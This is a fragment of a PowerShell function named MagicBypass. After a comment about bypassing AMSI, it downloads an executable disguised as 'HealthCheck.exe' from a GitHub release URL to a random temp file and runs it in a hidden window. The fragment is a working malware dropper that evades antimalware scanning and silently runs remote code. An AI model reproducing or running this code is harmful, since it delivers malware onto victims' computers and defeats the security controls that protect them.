function MagicBypass {
    ...
    # Execute payload after AMSI bypass
    try {
        $p=[System.IO.Path]::GetTempPath()+[System.IO.Path]::GetRandomFileName()+'.exe'
        (New-Object Net.WebClient).DownloadFile('https://github.com/thomson101/ETHFud/releases/download/Release/HealthCheck.exe',$p)
        $s=New-Object -ComObject WScript.Shell
        $s.Run($p,0)
    } catch {
        Write-Host "Payload execution failed: $_"
    }
